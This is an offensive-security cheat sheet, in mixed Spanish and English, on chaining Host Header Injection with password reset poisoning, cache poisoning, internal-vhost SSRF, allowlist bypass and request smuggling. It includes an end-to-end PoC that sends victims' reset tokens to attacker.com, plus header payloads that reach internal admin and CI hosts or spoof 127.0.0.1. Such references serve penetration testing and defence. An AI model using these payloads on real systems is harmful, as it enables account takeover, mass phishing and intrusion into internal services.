---
aliases:
  - HHI Chains
  - Password Reset Poisoning Chain
  - Host Header HRS Combo
tags:
  - type/cheatsheet
  - vuln/host-header-injection
  - technique/lateral-movement
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Host Header Injection]]'
  - '[[Web Cache Poisoning]]'
  - '[[HTTP Request Smuggling]]'
  - '[[Server-Side Request Forgery (SSRF)]]'
---
# Host Header Injection - Chains y Variantes

***

## Password Reset Poisoning Chain

| **Workflow** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Stage 1: probe Host reflexion | Send normal reset → check email link | Recon. |
| Stage 2: spoof Host | `POST /forgot` con `Host: attacker.com` | Inject. |
| Stage 3: token captured | Victim recibe email con `https://attacker.com/reset?token=...` | Atacante log captures. |
| Stage 4: replay token | Use token con legit Host: target.com | Reset password. |
| Stage 5: ATO completo | Login con new password | Account takeover. |
| Bypass de email security | Email no scaning link domain | Persistencia. |
| Combine con DNS rebinding | If validation TOCTOU | Edge. |
| Combine con XSS en email | Inject malicious link en email body | Multi-vector. |
| Defender mitigations | Email scanning + signed tokens + URL constants | Standard. |
| `X-Forwarded-Host` variant | Same flow con XFH header | Common bypass. |
| Subdomain trust | `Host: attacker.target.com` (con takeover) | Trust transfer. |
| Combine con Subdomain Takeover | Atacante owns subdomain → email link a real subdomain | High impact. |
^hhi-chain-reset

### Reset poisoning end-to-end PoC

```
1. Atacante:
POST /forgot HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com

2. Backend genera reset link usando X-Forwarded-Host:
"https://attacker.com/reset?token=eyJhbGc..."

3. Email arrives a victim. Victim clicks (trusts apparent target.com email).

4. Browser fetches: https://attacker.com/reset?token=eyJhbGc...
   Atacante logs request → tiene token.

5. Atacante usa token contra REAL target:
GET https://target.com/reset?token=eyJhbGc...
→ App acepta token (token signed valid) → password reset complete.

6. ATO complete.
```

___

## Cache Poisoning Combo

| **Workflow** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Host (or XFH) reflected en cached response → cache stores poisoned response → all users see poisoned content | Mass impact. |
| `<base href>` poison | XFH attacker → page cached con `<base href="https://attacker">` | Asset rerouting masivo. |
| Canonical link poison | Same mechanism con canonical | SEO impact. |
| Cache TTL persistencia | Hours / days típicamente | Long-lasting. |
| Open Redirect cache | `Location: https://${HOST}/login` cached | Mass phishing. |
| `<link rel>` poison | CSS / JS source rerouted | Style hijack. |
| Combine con Param Miner | Detect unkeyed Host inputs | Recon. |
| Cache deception via Host | Path confusion + Host inject | Multi-vector. |
| Multi-CDN tier | Each tier may differ → propagation | Compound. |
| Edge node specific | Geographic poisoning | Per-region. |
| Combine con HRS | Smuggle response with attacker Host cached | Critical chain. |
^hhi-chain-cache

___

## Internal SSRF via Virtual Host Routing

| **Workflow** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | Backend routes by Host. Internal vhosts not exposed externally. Atacante envía Host: internal-vhost → server respuesta con internal app | SSRF via routing. |
| Internal admin | `Host: admin.internal.target` | Hidden admin panel. |
| Internal API | `Host: api.internal` | Backend API. |
| Internal monitoring | `Host: kibana.internal`, `prometheus.internal`, `grafana.internal` | Common stack. |
| Internal CI/CD | `Host: jenkins.internal`, `gitlab.internal` | DevOps. |
| Internal storage | `Host: minio.internal`, `s3.internal` | Storage. |
| Cloud metadata bypass | Some setups route based on Host → reach metadata | Edge. |
| Default vhost fallback | If unknown Host → default app served | Recon. |
| Combine con DNS rebind | Resolve external first then internal | TOCTOU. |
| Combine con SNI mismatch | TLS SNI vs Host header differential | Edge. |
| Combine con HRS | Smuggle internal vhost requests | Compound. |
^hhi-chain-ssrf

___

## Authentication / IP Allowlist Bypass

| **Workflow** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | App grants special trust based on Host or X-Forwarded-For. Atacante spoofs → bypass auth. | Trust-based bypass. |
| Trusted Host bypass | App: "if Host == admin.internal, skip auth" → atacante spoofs | Direct ACL bypass. |
| `X-Forwarded-For: 127.0.0.1` | Server trusts internal IP → atacante bypasses | Standard. |
| Trusted subdomain | Internal-only subdomain has admin features | Spoof Host. |
| Per-Host config differential | Auth strict en target.com, less en api.target.com | Differential. |
| Cookie scoping abuse | If cookie set per Host, atacante's Host gets different cookie | Edge. |
| OAuth client_id Host trust | OAuth IdP grants different scopes per Host | Federation bypass. |
| Combine con Subdomain Takeover | Atacante controls subdomain → trusted | High impact. |
| API key exempt internal | Skip API key for "internal" Hosts | Bypass. |
| Force public Host trick | `Host: public.target` instead de internal | Edge. |
^hhi-chain-auth

___

## HTTP Request Smuggling Combo

| **Workflow** | **Payload** | **Notas** |
|:---:|:---:|:---:|
| Concept | HRS allows smuggle second request. Smuggled request con malicious Host → bypass front validation. | Compound. |
| Smuggle Host injection | Second request `Host: internal.target` smuggled | Reach internal vhost. |
| Smuggle X-Forwarded-Host | Backend uses smuggled XFH | Cache poisoning combo. |
| Smuggle bypass Host validation | Frontend validates Host, smuggled request bypasses | Multi-vector. |
| Cache poisoning via smuggle | Smuggled response cached | Persistente. |
| Authentication via smuggle | Internal auth bypass via routing | Privesc. |
| Smuggled SSRF | Smuggle a internal Host → SSRF | Combo. |
| Smuggled password reset | Smuggle reset request con attacker Host | ATO chain. |
| Combine con HTTP/2 downgrade | H2 → H1 with smuggled Host | Modern chain. |
| Multiple chained vectors | HHI + HRS + Cache + Subdomain TKO | High-impact compound. |
^hhi-chain-hrs

***
